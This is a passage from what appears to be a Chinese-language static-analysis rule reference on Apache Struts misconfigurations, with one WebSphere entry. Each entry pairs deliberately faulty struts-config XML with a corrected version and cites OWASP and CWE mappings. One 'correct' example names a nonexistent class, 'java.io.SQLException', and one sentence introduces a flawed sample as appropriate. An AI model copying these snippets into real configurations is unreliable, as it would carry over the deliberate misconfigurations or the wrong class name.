<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;form-beans&gt;</span><br><span class="line"></span><br><span class="line">  &lt;form-bean name=&quot;LoginForm&quot; type=&quot;org.apache.struts.validator.DynaValidatorForm&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form-property name=&quot;name&quot; type=&quot;java.lang.String&quot; /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form-property name=&quot;password&quot; type=&quot;java.lang.String&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/form-bean&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  &lt;form-bean name=&quot;ColorForm&quot; type=&quot;org.apache.struts.action.DynaActionForm&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form-property name=&quot;color&quot; type=&quot;java.lang.String&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/form-bean&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form-beans&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-204"><a href="#REFERENCES-204" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Apache Struts 1.3 Specification</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 694</p>
<p>[3] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[4] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<h4 id="Struts-Misconfiguration-Invalid-Path"><a href="#Struts-Misconfiguration-Invalid-Path" class="headerlink" title="Struts Misconfiguration: Invalid Path"></a>Struts Misconfiguration: Invalid Path</h4><h5 id="ABSTRACT-206"><a href="#ABSTRACT-206" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>无效的路径条目会导致 Struts 无法定位服务请求的正确资源。</p>
<h5 id="EXPLANATION-207"><a href="#EXPLANATION-207" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Struts 使用 path 属性定位处理请求所需的资源。该路径是相对于模块的位置，因此不以 “/” 字符开始的路径是错误的。</p>
<p>例 1：以下配置包含空路径。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;global-exceptions&gt;</span><br><span class="line"></span><br><span class="line">  &lt;exception key=&quot;global.error.invalidLogin&quot; path=&quot;&quot; scope=&quot;request&quot; type=&quot;InvalidLoginException&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/global-exceptions&gt;</span><br></pre></td></tr></table></figure>
<p>例 2：以下配置使用了不以 “/” 字符开始的路径。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;global-forwards&gt;</span><br><span class="line"></span><br><span class="line">  &lt;forward name=&quot;login&quot; path=&quot;Login.jsp&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/global-forwards&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-206"><a href="#RECOMMENDATIONS-206" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>确保每个 path 属性都以 “/” 字符开始。</p>
<p>例 3：以下配置正确地包括以 “/” 字符开始的 path 属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;global-forwards&gt;</span><br><span class="line"></span><br><span class="line">  &lt;forward name=&quot;login&quot; path=&quot;/Login.jsp&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/global-forwards&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-205"><a href="#REFERENCES-205" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Apache Struts 1.3 Specification</p>
<p>[2] Chuck Caveness, Brian Keeton</p>
<p>[3] struts-config_1_3.dtd</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[5] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<h4 id="Struts-Misconfiguration-Missing-Action-Input"><a href="#Struts-Misconfiguration-Missing-Action-Input" class="headerlink" title="Struts Misconfiguration: Missing Action Input"></a>Struts Misconfiguration: Missing Action Input</h4><h5 id="ABSTRACT-207"><a href="#ABSTRACT-207" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>忽略可返回验证错误的已命名 Struts 操作的 input 属性是错误的。</p>
<h5 id="EXPLANATION-208"><a href="#EXPLANATION-208" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>不论已命名操作是否返回验证错误，Struts 规范均要求包含 input 属性[2]。input 属性可指定验证错误出现时用来显示错误消息的页面。 例 1：以下配置定义了已命名的验证操作，但未指定 input 属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;action-mappings&gt;</span><br><span class="line"></span><br><span class="line">  &lt;action   path=&quot;/Login&quot;</span><br><span class="line"></span><br><span class="line">            type=&quot;com.LoginAction&quot;</span><br><span class="line"></span><br><span class="line">            name=&quot;LoginForm&quot;</span><br><span class="line"></span><br><span class="line">            scope=&quot;request&quot;</span><br><span class="line"></span><br><span class="line">            validate=&quot;true&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/action-mappings&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-207"><a href="#RECOMMENDATIONS-207" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>定义包含 name 属性的操作且该操作可以返回验证错误时，也必须指定 input 属性。</p>
<p>例 2：以下配置正确地定义了具有有效输入页面的已命名验证操作。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;action   path=&quot;/Login&quot;</span><br><span class="line"></span><br><span class="line">          type=&quot;LoginAction&quot;</span><br><span class="line"></span><br><span class="line">          name=&quot;LoginForm&quot;</span><br><span class="line"></span><br><span class="line">          scope=&quot;request&quot;</span><br><span class="line"></span><br><span class="line">          input=&quot;/jsp/Login.jsp&quot;</span><br><span class="line"></span><br><span class="line">          validate=&quot;true&quot;/&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-206"><a href="#REFERENCES-206" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Apache Struts 1.3 Specification</p>
<p>[2] struts-config_1_3.dtd</p>
<p>[3] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[4] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<h4 id="Struts-Misconfiguration-Missing-Exception-Type"><a href="#Struts-Misconfiguration-Missing-Exception-Type" class="headerlink" title="Struts Misconfiguration: Missing Exception Type"></a>Struts Misconfiguration: Missing Exception Type</h4><h5 id="ABSTRACT-208"><a href="#ABSTRACT-208" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>将不会使用不包含 type 属性的 <code>&lt;exception&gt;</code> 标签。</p>
<h5 id="EXPLANATION-209"><a href="#EXPLANATION-209" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p><code>&lt;exception&gt;</code> 标签要求定义异常类型。缺少或 type 属性为空表示存在冗余的异常处理器或意外遗漏该属性。如果开发人员有意处理一个异常情况但忘记定义异常类型，应用程序就可能泄露与系统相关的敏感信息。 例 1：以下配置会忽略<code>&lt;exception&gt;</code> 标签的类型。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;global-exceptions&gt;</span><br><span class="line"></span><br><span class="line">  &lt;exception</span><br><span class="line"></span><br><span class="line">    key=&quot;error.key&quot;</span><br><span class="line"></span><br><span class="line">    handler=&quot;com.mybank.ExceptionHandler&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/global-exceptions&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-208"><a href="#RECOMMENDATIONS-208" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为每个 <code>&lt;exception&gt;</code>标签定义类型。 例 2：以下配置正确地指定了<code>&lt;exception&gt;</code> 标签的类型。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;global-exceptions&gt;</span><br><span class="line"></span><br><span class="line">  &lt;exception</span><br><span class="line"></span><br><span class="line">    key=&quot;error.key&quot;</span><br><span class="line"></span><br><span class="line">    type=&quot;java.io.SQLException&quot;</span><br><span class="line"></span><br><span class="line">    handler=&quot;com.mybank.ExceptionHandler&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/global-exceptions&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-207"><a href="#REFERENCES-207" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Apache Struts 1.3 Specification</p>
<p>[2] struts-config_1_3.dtd</p>
<p>[3] Building Controller Components</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 248</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A7 Improper Error Handling</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.7</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.2, Requirement 6.5.6</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3120 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3120 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3120 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3120 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3120 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3120 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3120 CAT II</p>
<h4 id="Struts-Misconfiguration-Missing-Form-Bean"><a href="#Struts-Misconfiguration-Missing-Form-Bean" class="headerlink" title="Struts Misconfiguration: Missing Form Bean"></a>Struts Misconfiguration: Missing Form Bean</h4><h5 id="ABSTRACT-209"><a href="#ABSTRACT-209" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>指向不存在的 form-bean 的 Struts action 将不会正确进行映射。</p>
<h5 id="EXPLANATION-210"><a href="#EXPLANATION-210" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Struts 使用 form-bean 条目将 HTML 形式映射至操作。如果 <code>&lt;action&gt;</code> 标签中的 name 属性与 form-bean 的名称不对应，则无法映射此操作，并表示存在冗余定义或排字错误。</p>
<p>例 1：以下配置不包含 bean2 的映射。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;form-beans&gt;</span><br><span class="line"></span><br><span class="line">  &lt;form-bean name=&quot;bean1&quot; type=&quot;coreservlets.UserFormBean&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form-beans&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;action-mappings&gt;</span><br><span class="line"></span><br><span class="line">  &lt;action path=&quot;/actions/register1&quot; type=&quot;coreservlets.RegisterAction1&quot; name=&quot;bean1&quot; scope=&quot;request&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;action path=&quot;/actions/register2&quot; type=&quot;coreservlets.RegisterAction2&quot; name=&quot;bean2&quot; scope=&quot;request&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/action-mappings&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-209"><a href="#RECOMMENDATIONS-209" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>确保存在一个 form-bean 条目，并且该条目与<code>&lt;action&gt;</code> 标签中发现的每个 name 属性相对应。</p>
<p>例 2：以下配置包含 bean1 和 bean2 的正确映射。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;form-beans&gt;</span><br><span class="line"></span><br><span class="line">  &lt;form-bean name=&quot;bean1&quot; type=&quot;coreservlets.UserFormBean&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;form-bean name=&quot;bean2&quot; type=&quot;coreservlets.UserFormBean&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form-beans&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;action-mappings&gt;</span><br><span class="line"></span><br><span class="line">  &lt;action path=&quot;/actions/register1&quot; type=&quot;coreservlets.RegisterAction1&quot; name=&quot;bean1&quot; scope=&quot;request&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;action path=&quot;/actions/register2&quot; type=&quot;coreservlets.RegisterAction2&quot; name=&quot;bean2&quot; scope=&quot;request&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/action-mappings&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-208"><a href="#REFERENCES-208" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Apache Struts 1.3 Specification</p>
<p>[2] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[3] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<h4 id="Struts-Misconfiguration-Missing-Form-Bean-Name"><a href="#Struts-Misconfiguration-Missing-Form-Bean-Name" class="headerlink" title="Struts Misconfiguration: Missing Form Bean Name"></a>Struts Misconfiguration: Missing Form Bean Name</h4><h5 id="ABSTRACT-210"><a href="#ABSTRACT-210" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>将不会使用不包含 name 属性的 form-bean。</p>
<h5 id="EXPLANATION-211"><a href="#EXPLANATION-211" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Struts 使用 form-bean 名称将 HTML 形式映射至操作。如果 form-bean 没有名称，则它无法被映射至操作，并表示存在冗余定义或意外被忽略的 bean。 下面是一个适当的 form-bean 示例： 例 1：以下 form-bean 有一个空的 name 属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;form-beans&gt;</span><br><span class="line"></span><br><span class="line">  &lt;form-bean name=&quot;&quot; type=&quot;org.apache.struts.validator.DynaValidatorForm&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form-property name=&quot;name&quot; type=&quot;java.lang.String&quot; /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form-property name=&quot;password&quot; type=&quot;java.lang.String&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/form-bean&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form-beans&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-210"><a href="#RECOMMENDATIONS-210" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为每个 form-bean 指定名称。</p>
<p>例 2：以下 form-bean 正确地包含了 name 属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;form-beans&gt;</span><br><span class="line"></span><br><span class="line">  &lt;form-bean name=&quot;LoginForm&quot; type=&quot;org.apache.struts.validator.DynaValidatorForm&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form-property name=&quot;name&quot; type=&quot;java.lang.String&quot; /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form-property name=&quot;password&quot; type=&quot;java.lang.String&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/form-bean&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form-beans&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-209"><a href="#REFERENCES-209" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Apache Struts 1.3 Specification</p>
<p>[2] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[3] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<h4 id="Struts-Misconfiguration-Missing-Form-Bean-Type"><a href="#Struts-Misconfiguration-Missing-Form-Bean-Type" class="headerlink" title="Struts Misconfiguration: Missing Form Bean Type"></a>Struts Misconfiguration: Missing Form Bean Type</h4><h5 id="ABSTRACT-211"><a href="#ABSTRACT-211" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>将不会正确映射不包含 type 属性的 form-bean。</p>
<h5 id="EXPLANATION-212"><a href="#EXPLANATION-212" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Struts 使用 form-bean 条目将 HTML 形式映射至操作。如果 form-bean 没有类型，则其不能映射到一个操作。 例 1：以下 form-bean 有一个空的 type 属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;form-beans&gt;</span><br><span class="line"></span><br><span class="line">  &lt;form-bean name=&quot;loginForm&quot; type=&quot;&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form-property name=&quot;name&quot; type=&quot;java.lang.String&quot; /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form-property name=&quot;password&quot; type=&quot;java.lang.String&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/form-bean&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form-beans&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-211"><a href="#RECOMMENDATIONS-211" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为每个 form-bean 指定类型。</p>
<p>例 2：以下 form-bean 正确地包含了类型属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;form-beans&gt;</span><br><span class="line"></span><br><span class="line">  &lt;form-bean name=&quot;LoginForm&quot; type=&quot;org.apache.struts.validator.DynaValidatorForm&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form-property name=&quot;name&quot; type=&quot;java.lang.String&quot; /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form-property name=&quot;password&quot; type=&quot;java.lang.String&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/form-bean&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form-beans&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-210"><a href="#REFERENCES-210" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Apache Struts 1.3 Specification</p>
<p>[2] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[3] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<h4 id="Struts-Misconfiguration-Missing-Form-Property-Type"><a href="#Struts-Misconfiguration-Missing-Form-Property-Type" class="headerlink" title="Struts Misconfiguration: Missing Form Property Type"></a>Struts Misconfiguration: Missing Form Property Type</h4><h5 id="ABSTRACT-212"><a href="#ABSTRACT-212" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>定义不包含 type 类型属性的 form-property 是错误的。</p>
<h5 id="EXPLANATION-213"><a href="#EXPLANATION-213" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Struts 要求 <code>&lt;form-property&gt;</code> 标签包含 type 属性。在处理定义了不包含类型的 form-property 的表单时，Struts 将抛出异常。</p>
<p>例 1：以下配置会忽略 name 属性的类型。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;form-bean name=&quot;loginForm&quot; type=&quot;org.apache.struts.validator.DynaValidatorForm&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;form-property name=&quot;name&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;form-property name=&quot;password&quot; type=&quot;java.lang.String&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form-bean&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-212"><a href="#RECOMMENDATIONS-212" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在定义 form-property 时应始终指定完整的类名。 例 2：以下配置正确地指定了 name 属性的类型。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;form-bean name=&quot;loginForm&quot; type=&quot;org.apache.struts.validator.DynaValidatorForm&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;form-property name=&quot;name&quot; type=&quot;java.lang.String&quot;/&gt;</span><br><span class="line"></span><br><span class="line">  &lt;form-property name=&quot;password&quot; type=&quot;java.lang.String&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form-bean&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-211"><a href="#REFERENCES-211" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Apache Struts 1.3 Specification</p>
<p>[2] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[3] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<h4 id="Struts-Misconfiguration-Missing-Forward-Name"><a href="#Struts-Misconfiguration-Missing-Forward-Name" class="headerlink" title="Struts Misconfiguration: Missing Forward Name"></a>Struts Misconfiguration: Missing Forward Name</h4><h5 id="ABSTRACT-213"><a href="#ABSTRACT-213" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>缺少 name 属性的<code>&lt;forward&gt;</code>标签通常表示存在 Leftover Debug Code 或排字错误。</p>
<h5 id="EXPLANATION-214"><a href="#EXPLANATION-214" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p><code>&lt;forward&gt;</code>标签必须具有 name 和 path 属性。将不会使用没有名称的 forward。</p>
<p>例 1：以下 <code>&lt;forward&gt;</code>标签有一个空的 name 属性。</p>
<p>  <code>&lt;forward name=&quot;&quot; path=&quot;/results.jsp&quot;/&gt;</code></p>
<h5 id="RECOMMENDATIONS-213"><a href="#RECOMMENDATIONS-213" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为每个 <code>&lt;forward&gt;</code> 标签定义名称。 例 2：以下 <code>&lt;forward&gt;</code>标签正确地定义了名称属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;forward name=&quot;login&quot; path=&quot;/results.jsp&quot;/&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-212"><a href="#REFERENCES-212" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Apache Struts 1.3 Specification</p>
<p>[2] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[3] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<h4 id="Struts-Misconfiguration-Missing-Forward-Path"><a href="#Struts-Misconfiguration-Missing-Forward-Path" class="headerlink" title="Struts Misconfiguration: Missing Forward Path"></a>Struts Misconfiguration: Missing Forward Path</h4><h5 id="ABSTRACT-214"><a href="#ABSTRACT-214" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>缺少 path 属性的 <code>&lt;forward&gt;</code> 标签通常表示存在 Leftover Debug Code 或排字错误。</p>
<h5 id="EXPLANATION-215"><a href="#EXPLANATION-215" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p><code>&lt;forward&gt;</code> 标签必须具有 name 和 path 属性。忽略路径或指定空路径都是错误的。此外，所有路经必须以 “/” 字符开始。</p>
<p>例 1：以下 <code>&lt;forward&gt;</code> 标签缺少 path 属性。</p>
<p>   <code>&lt;forward name=&quot;success&quot; /&gt;</code></p>
<h5 id="RECOMMENDATIONS-214"><a href="#RECOMMENDATIONS-214" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为每个 <code>&lt;forward&gt;</code> 标签定义路径。 例 2：以下 <code>&lt;forward&gt;</code> 标签正确地定义了路径属性。</p>
<p>  <code>&lt;forward name=&quot;success&quot; path=&quot;/pages/success.jsp&quot; /&gt;</code></p>
<h5 id="REFERENCES-213"><a href="#REFERENCES-213" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Apache Struts 1.3 Specification</p>
<p>[2] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[3] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<h4 id="WebSphere-Misconfiguration-Missing-Nonce"><a href="#WebSphere-Misconfiguration-Missing-Nonce" class="headerlink" title="WebSphere Misconfiguration: Missing Nonce"></a>WebSphere Misconfiguration: Missing Nonce</h4><h5 id="ABSTRACT-215"><a href="#ABSTRACT-215" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>若 SOAP 消息含有不会到期的时间戳，则它可能容易受到 replay 攻击。</p>
<h5 id="EXPLANATION-216"><a href="#EXPLANATION-216" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Nonce 是随消息一起发送的加密随机值，可防止 replay 攻击。将 nonce 与时间戳（或有效期）结合使用时，每个消息都是唯一的，且只能在特定时间内有效，从而可以防止重新传输旧的消息。</p>
